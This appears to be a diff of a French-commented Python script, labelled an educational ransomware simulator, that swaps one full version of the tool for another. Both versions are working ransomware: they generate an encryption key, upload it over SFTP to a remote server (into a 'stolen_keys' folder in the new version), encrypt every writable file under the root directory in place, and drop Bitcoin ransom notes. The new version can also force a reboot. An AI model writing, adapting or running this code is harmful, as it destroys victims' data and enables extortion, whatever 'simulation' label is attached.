@@ -1,224 +1,239 @@
 #!/usr/bin/env python3
-# ransomware_system_full_auto.py - Version corrigée avec installation auto des dépendances
+# ransomware_total.py - Simulation pédagogique complète
+# Usage: sudo python3 ransomware_total.py (UNIQUEMENT EN VM ISOLEE)
 
 import logging
 import os
 import socket
 import subprocess
 import sys
-from datetime import datetime
+import time
+import paramiko
+from cryptography.fernet import Fernet
 
-# Configuration SFTP
-SFTP_SERVER = "192.168.239.130"
-SFTP_USER = "test"
-SFTP_PASS = "test"
-SFTP_PORT = 22
-SFTP_REMOTE_PATH = "/upload"
+# Configuration initiale
+LOG_FILE = "/var/log/ransomware_sim.log"
+SFTP_KEY_PATH = "/tmp/encryption_key.key"
 
-# Configuration locale
-LOG_FILE = "/tmp/ransomware_full_system.log"
-RANSOM_NOTE = "/tmp/README_RANSOMWARE.txt"
-SAFETY_LOCK = "/tmp/ransomware_safety.lock"
+# Initialisation du logging
+logging.basicConfig(
+    filename=LOG_FILE,
+    level=logging.INFO,
+    format="%(asctime)s - %(levelname)s - %(message)s"
+)
 
-# Exclusions absolues
-EXCLUSIONS = {
-    '/proc', '/dev', '/sys', '/run', '/tmp',
-    LOG_FILE, RANSOM_NOTE, SAFETY_LOCK, __file__
-}
+class RansomwareSimulator:
+    def __init__(self):
+        self.fernet = None
+        self.key = None
+        self.sftp_config = {
+            'server': None,
+            'port': 22,
+            'user': None,
+            'password': None
+        }
 
-
-def install_dependencies():
-    """Installe automatiquement les dépendances manquantes"""
-    required = {'paramiko', 'cryptography'}
-    installed = set()
-
-    # Vérification des imports
-    for lib in required:
-        try:
-            __import__(lib)
-            installed.add(lib)
-        except ImportError:
-            pass
-
-    if required - installed:
-        print("Installation des dépendances manquantes...")
-        try:
-            subprocess.check_call([sys.executable, '-m', 'pip', 'install', *required])
-            print("Dépendances installées avec succès. Veuillez relancer le script.")
-            sys.exit(0)
-        except subprocess.CalledProcessError:
-            print("Échec de l'installation des dépendances. Installer manuellement avec:")
-            print(f"pip install {' '.join(required)}")
+    def check_root(self):
+        """Vérifie les privilèges root"""
+        if os.geteuid() != 0:
+            logging.error("Le script doit être exécuté en tant que root!")
             sys.exit(1)
 
-
-# Vérifier les dépendances dès le début
-install_dependencies()
-
-# Maintenant que les dépendances sont garanties, on peut importer
-from cryptography.fernet import Fernet
-import paramiko
-
-
-def safety_checks():
-    """Vérifications de sécurité"""
-    if os.path.exists(SAFETY_LOCK):
-        logging.critical("Lock file exists - aborting!")
-        sys.exit(1)
-
-    with open(SAFETY_LOCK, 'w') as f:
-        f.write("Lock active - do not delete during operation")
-
-    print("""
-    ⚠️ DANGER - CHIFFREMENT SYSTÈME COMPLET ⚠️
-
-    Ce script va:
-    1. Générer une clé de chiffrement
-    2. L'envoyer à votre serveur SFTP
-    3. Chiffrer TOUS les fichiers accessibles
-
-    Appuyez sur Ctrl+C IMMÉDIATEMENT pour annuler
-    """)
-
-    if input("Tapez 'CHIFFREMENT-COMPLET' pour confirmer: ") != "CHIFFREMENT-COMPLET":
-        os.remove(SAFETY_LOCK)
-        sys.exit(0)
-
-
-def send_key_via_sftp(key):
-    """Envoi réel de la clé via SFTP avec gestion d'erreur améliorée"""
-    transport = None
-    sftp = None
-    try:
-        # Configuration du transport
-        transport = paramiko.Transport((SFTP_SERVER, SFTP_PORT))
-        transport.connect(username=SFTP_USER, password=SFTP_PASS)
-
-        sftp = paramiko.SFTPClient.from_transport(transport)
-
-        # Vérification et création du répertoire upload
+    def generate_key(self):
+        """Génère une clé de chiffrement Fernet"""
         try:
-            sftp.stat(SFTP_REMOTE_PATH)
-        except IOError:
-            try:
-                sftp.mkdir(SFTP_REMOTE_PATH)
-                logging.info(f"Répertoire {SFTP_REMOTE_PATH} créé avec succès sur le serveur SFTP")
-            except Exception as e:
-                logging.error(f"Échec création répertoire {SFTP_REMOTE_PATH}: {str(e)}")
-                return False
-
-        # Envoi du fichier
-        remote_file = f"{SFTP_REMOTE_PATH}/{socket.gethostname()}_key_{datetime.now().strftime('%Y%m%d_%H%M%S')}.key"
-
-        with sftp.file(remote_file, 'wb') as f:
-            f.write(key)
-
-        logging.info(f"Clé envoyée avec succès à {remote_file}")
-        return True
-
-    except Exception as e:
-        logging.error(f"ERREUR SFTP: {type(e).__name__} - {str(e)}")
-        return False
-    finally:
-        if sftp:
-            sftp.close()
-        if transport:
-            transport.close()
-
-
-def should_encrypt(path):
-    """Détermine si un fichier doit être chiffré"""
-    path = os.path.abspath(path)
-    return all(not path.startswith(excl) for excl in EXCLUSIONS)
-
-
-def encrypt_file(path, fernet):
-    """Chiffre un fichier individuel"""
-    try:
-        if not should_encrypt(path) or not os.path.isfile(path):
+            self.key = Fernet.generate_key()
+            with open(SFTP_KEY_PATH, "wb") as key_file:
+                key_file.write(self.key)
+            self.fernet = Fernet(self.key)
+            logging.info(f"Clé générée: {SFTP_KEY_PATH}")
+            print(f"\n[+] Clé générée: {SFTP_KEY_PATH}")
+            return True
+        except Exception as e:
+            logging.error(f"Erreur génération clé: {str(e)}")
             return False
 
-        with open(path, 'rb') as f:
-            data = f.read()
+    def configure_sftp(self):
+        """Configure les paramètres SFTP"""
+        print("\n[ Configuration SFTP ]")
+        self.sftp_config['server'] = input("IP du serveur SFTP: ").strip()
+        self.sftp_config['user'] = input("Utilisateur SFTP: ").strip()
+        self.sftp_config['password'] = input("Mot de passe SFTP: ").strip()
+        port = input("Port SFTP [22]: ").strip()
+        self.sftp_config['port'] = int(port) if port else 22
 
-        encrypted = fernet.encrypt(data)
+    def send_key_via_sftp(self):
+        """Transmet la clé via SFTP"""
+        if not self.key:
+            print("\n[!] Générer d'abord une clé")
+            return False
 
-        with open(path, 'wb') as f:
-            f.write(encrypted)
+        try:
+            transport = paramiko.Transport((self.sftp_config['server'], self.sftp_config['port']))
+            transport.connect(username=self.sftp_config['user'], password=self.sftp_config['password'])
+            sftp = paramiko.SFTPClient.from_transport(transport)
 
-        return True
+            remote_dir = f"/home/{self.sftp_config['user']}/stolen_keys"
+            try:
+                sftp.mkdir(remote_dir)
+            except IOError:
+                pass
 
-    except Exception as e:
-        logging.warning(f"Échec chiffrement {path}: {str(e)}")
-        return False
+            remote_path = f"{remote_dir}/{socket.gethostname()}_key.key"
+            sftp.put(SFTP_KEY_PATH, remote_path)
+            sftp.close()
+            transport.close()
 
+            logging.info(f"Clé envoyée à {self.sftp_config['server']}:{remote_path}")
+            print(f"\n[+] Clé envoyée à {self.sftp_config['server']}")
+            return True
+        except Exception as e:
+            logging.error(f"Échec SFTP: {str(e)}")
+            print(f"\n[!] Échec envoi: {str(e)}")
+            return False
 
-def encrypt_system(fernet):
-    """Parcourt et chiffre le système de fichiers"""
-    encrypted_count = 0
+    def encrypt_file(self, filepath):
+        """Chiffre un fichier en place"""
+        try:
+            # Vérification supplémentaire pour éviter les fichiers spéciaux
+            if not os.path.isfile(filepath) or os.path.islink(filepath):
+                return False
 
-    for root, dirs, files in os.walk('/'):
-        for file in files:
-            filepath = os.path.join(root, file)
-            if encrypt_file(filepath, fernet):
-                encrypted_count += 1
-                if encrypted_count % 100 == 0:
-                    logging.info(f"Chiffrés: {encrypted_count} - Traitement {filepath}")
+            with open(filepath, "rb") as f:
+                original = f.read()
 
-    return encrypted_count
+            encrypted = self.fernet.encrypt(original)
 
+            with open(filepath, "wb") as f:
+                f.write(encrypted)
+
+            return True
+        except Exception as e:
+            logging.warning(f"Erreur sur {filepath}: {str(e)}")
+            return False
+
+    def encrypt_system(self):
+        """Chiffre tous les fichiers accessibles"""
+        if not self.fernet:
+            print("\n[!] Générer d'abord une clé")
+            return
+
+        print("\n[!] ATTENTION: Chiffrement complet du système!")
+        confirm = input("Confirmez (tapez 'CHIFFRER'): ")
+        if confirm != "CHIFFRER":
+            print("Annulé")
+            return
+
+        exclude_dirs = {
+            '/proc', '/sys', '/dev', '/run', '/tmp',
+            '/var/run', '/var/lock', '/snap'
+        }
+
+        total = 0
+        start_time = time.time()
+
+        for root, _, files in os.walk('/'):
+            if any(root.startswith(ex) for ex in exclude_dirs):
+                continue
+
+            for file in files:
+                filepath = os.path.join(root, file)
+                try:
+                    if os.access(filepath, os.W_OK):
+                        if self.encrypt_file(filepath):
+                            total += 1
+                            if total % 100 == 0:
+                                print(f"\r[+] Fichiers chiffrés: {total}", end='')
+                except Exception as e:
+                    continue
+
+        logging.info(f"Chiffrement terminé: {total} fichiers en {time.time()-start_time:.2f}s")
+        print(f"\n\n[+] Terminé: {total} fichiers chiffrés")
+
+    def create_ransom_note(self):
+        """Crée le fichier README sur le bureau"""
+        note = f"""
+        VOS FICHIERS ONT ÉTÉ CHIFFRÉS!
+
+        Pour récupérer vos données:
+        1. Envoyez 0.5 BTC à: 1Ma1wareSimu1BitcoinAddres5
+        2. Contactez: ransomware@example.com
+        ID: {socket.gethostname()}
+        """
+
+        # Place le README sur tous les bureaux trouvés
+        created = 0
+        for root, dirs, _ in os.walk('/home'):
+            if 'Desktop' in dirs:
+                path = os.path.join(root, 'Desktop', 'README.txt')
+                try:
+                    with open(path, 'w') as f:
+                        f.write(note)
+                    created += 1
+                except:
+                    continue
+
+        # Ajoute aussi à la racine
+        try:
+            with open('/README.txt', 'w') as f:
+                f.write(note)
+            created += 1
+        except:
+            pass
+
+        print(f"\n[+] {created} notes de rançon placées")
+
+    def reboot_system(self):
+        """Redémarre le système"""
+        print("\n[!] Redémarrage en cours...")
+        logging.info("Déclenchement du redémarrage")
+        try:
+            subprocess.run(['reboot'], check=True)
+        except subprocess.CalledProcessError as e:
+            logging.error(f"Échec redémarrage: {str(e)}")
+            sys.exit(1)
+
+    def show_menu(self):
+        """Affiche le menu principal"""
+        while True:
+            print("\n" + "="*50)
+            print(" RANSOMWARE SIMULATEUR - MENU PRINCIPAL")
+            print("="*50)
+            print("1. Générer une clé de chiffrement")
+            print("2. Configurer le serveur SFTP")
+            print("3. Envoyer la clé via SFTP")
+            print("4. Chiffrer TOUS les fichiers (/)")
+            print("5. Placer les notes de rançon")
+            print("6. Redémarrer le système")
+            print("0. Quitter")
+            print("="*50)
+
+            choice = input("\nVotre choix: ").strip()
+
+            if choice == "1":
+                self.generate_key()
+            elif choice == "2":
+                self.configure_sftp()
+            elif choice == "3":
+                self.send_key_via_sftp()
+            elif choice == "4":
+                self.encrypt_system()
+            elif choice == "5":
+                self.create_ransom_note()
+            elif choice == "6":
+                self.reboot_system()
+            elif choice == "0":
+                print("\n[+] Fermeture du programme.")
+                sys.exit(0)
+            else:
+                print("\n[!] Choix invalide")
 
 def main():
-    # Activation du debug paramiko
-    paramiko.util.log_to_file('/tmp/paramiko_debug.log')
-
-    # Configuration logging
-    logging.basicConfig(
-        filename=LOG_FILE,
-        level=logging.DEBUG,  # Changé en DEBUG pour plus d'informations
-        format='%(asctime)s - %(levelname)s - %(message)s'
-    )
-
-    # Vérifications
-    safety_checks()
-    if os.geteuid() != 0:
-        logging.critical("Doit être exécuté en root!")
-        sys.exit(1)
-
-    logging.critical("=== DÉBUT CHIFFREMENT SYSTÈME ===")
-
-    # Génération clé
-    key = Fernet.generate_key()
-    fernet = Fernet(key)
-    logging.info(f"Clé générée: {key[:16]}...")
-
-    # Envoi SFTP
-    if not send_key_via_sftp(key):
-        logging.critical("Échec envoi clé - arrêt")
-        sys.exit(1)
-
-    # Chiffrement
-    try:
-        count = encrypt_system(fernet)
-        logging.info(f"Chiffrement complet - {count} fichiers traités")
-
-        # Note de rançon
-        with open(RANSOM_NOTE, 'w') as f:
-            f.write(f"""VOS FICHIERS ONT ÉTÉ CHIFFRÉS!
-
-Clé de déchiffrement envoyée à: {SFTP_SERVER}
-Fichiers chiffrés: {count}
-""")
-
-    except Exception as e:
-        logging.error(f"ERREUR FATALE: {str(e)}", exc_info=True)
-        raise
-    finally:
-        if os.path.exists(SAFETY_LOCK):
-            os.remove(SAFETY_LOCK)
-
-    logging.critical("=== CHIFFREMENT TERMINÉ ===")
-
+    """Fonction principale"""
+    simulator = RansomwareSimulator()
+    simulator.check_root()
+    logging.info("=== Démarrage du simulateur ===")
+    simulator.show_menu()
 
 if __name__ == "__main__":
     main()
